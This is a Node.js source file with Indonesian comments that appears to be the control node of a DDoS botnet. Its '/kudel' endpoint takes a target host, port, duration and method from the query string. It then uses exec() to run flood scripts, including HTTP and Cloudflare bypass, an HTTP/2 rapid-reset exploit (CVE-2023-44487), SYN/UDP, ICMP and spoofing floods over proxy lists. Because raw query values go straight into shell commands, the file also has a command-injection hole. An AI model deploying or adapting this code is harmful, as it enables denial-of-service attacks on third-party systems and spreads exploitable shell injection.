const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// Fungsi untuk mengambil data dari API
async function fetchData() {
  try {
    const response = await axios.get('https://httpbin.org/get');
    const data = response.data;
    console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
    return data;
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}

// Endpoint untuk menerima request serangan
app.get('/kudel', (req, res) => {
  const { host, port, time, methods } = req.query;

  // Validasi parameter
  if (!host || !port || !time || !methods) {
    return res.status(400).json({
      error: 'Missing required parameters'
    });
  }

  // Respon ke client
  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target: host,
    time,
    methods
  });

  console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

  // Daftar metode serangan
  const attackMethods = {
    'HTTP-BYPASS': `node ./lib/cache/HTTP_BYPASS.js ${host} ${time} 30 1 proxy.txt`,
    'CF-BYPASS': `node ./lib/cache/CF_BYPASS.js ${host} ${time} 1 proxy.txt 30 captcha`,
    'RAPIDRESET': `node ./lib/cache/CVE-2023-44487.js GET "${host}?q=%RAND%" ${time} 1 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full`,
    'HTTP-RAW': `node ./lib/cache/HTTP_RAW.js ${host} ${time} 30 1 proxy.txt`, // Skrip Python
    'SPOOF': `node ./lib/cache/SPOOF.js ${host} ${time} 30 1 proxy.txt`,
    'FLOOD-QUERYSTRING': `node ./lib/cache/FLOOD_QUERYSTRING.js ${host} proxy.txt ${time} GET 1`,
    'UAM': `node ./lib/cache/UAM.js ${host} ${time} 30 1 proxy.txt`,
    'BROWSER': `node ./lib/cache/BROWSER.js ${host} ${time} 1 proxy.txt`,
    'APACHE': `node ./lib/cache/APACHE.js ${host} ${time} 30 1 proxy.txt`,
    'TCP/SYN/UDP': `python3 ./lib/cache/SYN-FLOOD.py ${time} ${host} ${port} 450 1`, // Skrip Python
    'PROXY': `node scrape.js`,
    'ICMP': `node ./lib/cache/ICMP.js ${host} 2500 1 1000 60`,
    'HTTP2': `node ./lib/cache/HTTP2.js ${host} ${time} 30 1 proxy.txt`
  };

  const selectedMethod = attackMethods[methods];

  if (selectedMethod) {
    // Eksekusi perintah
    exec(selectedMethod, (error, stdout, stderr) => {
      if (error) {
        console.error(`Execution error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`Stderr: ${stderr}`);
        return;
      }
      console.log(`Executed: ${selectedMethod}`);
      console.log(`Output: ${stdout}`);
    });
  } else {
    console.log(`Unsupported method: ${methods}`);
  }
});

// Jalankan server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  fetchData();
});